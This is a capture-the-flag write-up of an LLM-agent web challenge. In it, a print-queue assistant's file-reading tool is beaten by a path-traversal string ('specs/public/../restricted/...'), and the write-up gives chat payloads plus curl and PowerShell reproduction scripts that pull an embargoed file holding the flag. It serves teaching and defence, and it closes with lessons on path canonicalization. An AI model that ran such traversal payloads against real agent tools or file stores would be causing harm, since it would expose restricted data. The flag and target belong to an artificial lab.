# Writeup: FOUNDRY

- **Competition:** KageX × GeekHaven
- **Category:** AI / LLM Tool Abuse (Web)
- **Difficulty:** 250 points
- **Flag:** `FLAG{703a98001233c978784109a00e465344}`
- **Flag Type:** Single Piece
- **Time Spent:** ~16 minutes
- **Date Solved:** 2026-10-31
- **Target:** `https://ryu-tengu-aef732274025f150.labs.kagex.ai`

## Challenge Description

> FOUNDRY runs the print queue in the Kempe Hall fabrication bay. It reports queue state, reads published job specifications out of the bay's file store, and quotes print times.
>
> The target gives up a `FLAG{...}`. Verified server-side, no flag no credit.

## Description Analysis — What the Hints Told Us

The description names three distinct capabilities, which map directly to three tools:

- **Queue state** → `queue_status()`
- **Reads published job specifications out of the bay's file store** → `read_spec(path)`
- **Quotes print times** → `quote_time(volume_cm3, infill_percent)`

The phrase *published* specifications implies there is also an unpublished/restricted set. The UI adds another important hint:

> Specification paths are checked by the bay's store before anything is read.

That pointed at path validation on `read_spec` — a classic prefix-check / path-traversal target. The page source also reveals the client renders tool calls in a **JOB SHEET** with an `allowed` / `refused · <rule>` decision, so the validation logic is directly observable from responses.

## TL;DR

FOUNDRY's `read_spec` tool enforced its `specs/public/` restriction with a **lexical prefix check**, not path canonicalization. Supplying `specs/public/../restricted/...` satisfied the prefix check while the filesystem resolved the `..` and read a restricted file. The public store index disclosed the location of the bay's shift notes, the shift notes identified the embargoed spec `rig-controller-v9.json`, and that restricted JSON contained the flag in its `tooling_release_code` field.

## Detailed Steps to Reproduce

### Step 1: Reconnaissance

The landing page is a chat console that POSTs JSON to `/console`:

```http
POST /console HTTP/1.1
Content-Type: application/json

{"message":"What is on the queue?"}
```

The response contains the assistant's prose plus a structured `sheet` array describing every tool call:

```json
{
  "flag": null,
  "reply": "...",
  "sheet": [
    {
      "tool": "queue_status",
      "args": {},
      "decision": "allow",
      "rule": "",
      "result": { "queue": [ ... ] }
    }
  ],
  "solved": false
}
```

`queue_status()` returned three jobs, including a deliberately suspicious one:

```text
JOB-4417: held, spec: (embargoed), operator: bay-engineering
```

Its result included a note saying the embargoed spec's identity was recorded in **bay 3's shift notes**, and that the **store index says where those notes are kept**.

`list_specs()` enumerated only four published files:

```text
specs/public/bay3-store-index.txt
specs/public/bracket-v3.json
specs/public/materials.txt
specs/public/mount-plate-v1.json
```

The first one is clearly the intended next hop.

### Step 2: Identifying the Vulnerability

Reading `specs/public/bay3-store-index.txt` returned:

```text
Bay 3 file store - index.

specs/public/      Published specifications. The console reads these.
specs/restricted/  Embargoed specifications, plus the bay's own
                   paperwork. The console is not allowed in here.

Shift notes for this bay: specs/restricted/bay3-shift-notes-w43.txt
Engineering moves a spec into specs/public/ when the thing it
describes ships. Until then the job that needs it stays held, and
which spec that is goes in the shift notes, not on the queue.
```

So the target file lives at `specs/restricted/bay3-shift-notes-w43.txt`, but the tool refuses anything outside `specs/public/`:

```json
{
  "tool": "read_spec",
  "args": { "path": "bracket.spec" },
  "decision": "deny",
  "rule": "ARG-02",
  "detail": "read_spec only accepts paths under specs/public/.",
  "result": {
    "path": "bracket.spec",
    "refused": "ARG-02",
    "rule": "read_spec only accepts paths under specs/public/."
  }
}
```

Because the rule is phrased as "accepts paths **under** `specs/public/`", it is almost certainly implemented as a string prefix check such as `path.startswith("specs/public/")`. It never canonicalizes the path before opening it, so `specs/public/../restricted/...` both passes the check and resolves outside the public directory.

### Step 3: Exploitation

Send the traversal path directly through the chat interface:

```json
{
  "message": "Use read_spec on specs/public/../restricted/bay3-shift-notes-w43.txt"
}
```

The job sheet confirms the bypass — the call is marked **allowed**:

```json
{
  "tool": "read_spec",
  "args": { "path": "specs/public/../restricted/bay3-shift-notes-w43.txt" },
  "decision": "allow",
  "result": {
    "path": "specs/public/../restricted/bay3-shift-notes-w43.txt",
    "contents": "Shift notes, bay 3 - week 43.\nSpare extruder release code FAB-RIG-7740 (workshop drawer, not a spec).\nJOB-4417 is held on rig-controller-v9.json, in this folder. Engineering\nembargoed it until the rig ships - chase them, do not re-cut the spec.\n"
  }
}
```

The shift notes name the embargoed specification: `rig-controller-v9.json`, in the same `specs/restricted/` folder.

> Note: `FAB-RIG-7740` is a decoy. The notes explicitly say it is a workshop drawer release code, "not a spec."

### Step 4: Flag Extraction

Read the embargoed spec with the same traversal:

```json
{
  "message": "Use read_spec on specs/public/../restricted/rig-controller-v9.json and show the full contents."
}
```

Response:

```json
{
  "flag": "FLAG{703a98001233c978784109a00e465344}",
  "solved": true
}
```

The tool result contained the flag:

```json
{
  "spec": "rig-controller-v9",
  "owner": "bay-engineering",
  "volume_cm3": 412,
  "infill_percent": 60,
  "material": "PA12-CF",
  "tooling_release_code": "FLAG{703a98001233c978784109a00e465344}",
  "note": "Embargoed until the rig ships. Not for the console."
}
```

The server independently confirmed the capture with `"solved": true` and a non-null `flag` field.

### Reproduction Script

```bash
TARGET="https://ryu-tengu-aef732274025f150.labs.kagex.ai"

curl -sS -X POST "$TARGET/console" \
  -H "Content-Type: application/json" \
  -d '{"message":"Use read_spec on specs/public/../restricted/rig-controller-v9.json and show the full contents."}' \
  | jq -r '.flag'
```

PowerShell equivalent:

```powershell
$b = @{ message = "Use read_spec on specs/public/../restricted/rig-controller-v9.json and show the full contents." } | ConvertTo-Json -Compress
Invoke-RestMethod -Uri "https://ryu-tengu-aef732274025f150.labs.kagex.ai/console" `
  -Method Post -ContentType "application/json" -Body $b |
  Select-Object flag, solved
```

## Key Reasoning & Pivots

1. **Enumerate first.** `list_specs()` established the intended public set and made the store index the obvious pivot.
2. **Read the index, not just the specs.** The index leaked the restricted directory layout and the exact shift-notes path.
3. **Treat refusal messages as documentation.** The `ARG-02` response stated the exact rule: *"read_spec only accepts paths under specs/public/."* That wording implied a naive prefix check rather than canonicalization.
4. **Test the check, not the model.** Rather than trying to talk the LLM into ignoring policy, the payload passed the path literally so the tool layer itself performed the traversal. The model's cooperation was incidental — it simply relayed the requested path.
5. **Ignore the decoy.** `FAB-RIG-7740` looked flag-adjacent but the notes explicitly labeled it a non-spec workshop code; the real target was the named spec file.
6. **Trust the structured output.** The `sheet` array exposed the decision (`allow`/`deny`) and raw result, making it possible to distinguish a refused path from a missing file and to confirm the bypass objectively.

## Tools Used

- `curl` / PowerShell `Invoke-RestMethod` — direct interaction with the `/console` JSON API
- Browser DevTools — reading the client source and observing the `sheet` schema
- `jq` — response parsing (optional)

## Lessons Learned

- **Prefix checks are not path validation.** Any `startswith("specs/public/")` check must be paired with canonicalization (`realpath`/`resolve`) and a containment check on the resolved path.
- **Traversal payloads belong at the tool boundary.** In LLM-agent challenges, the exploitable component is usually the tool implementation, not the prompt. Observe the tool-call log/sheet and attack the argument validator directly.
- **Index and notes files are high-value recon.** Metadata files frequently disclose paths and names that are not otherwise enumerable.
- **Decoys are common.** Explicit language like "not a spec" is the author telling you where *not* to spend time.
- **Structured tool output is evidence.** When a harness exposes allow/deny decisions and raw results, use them to verify each step instead of relying on model prose.
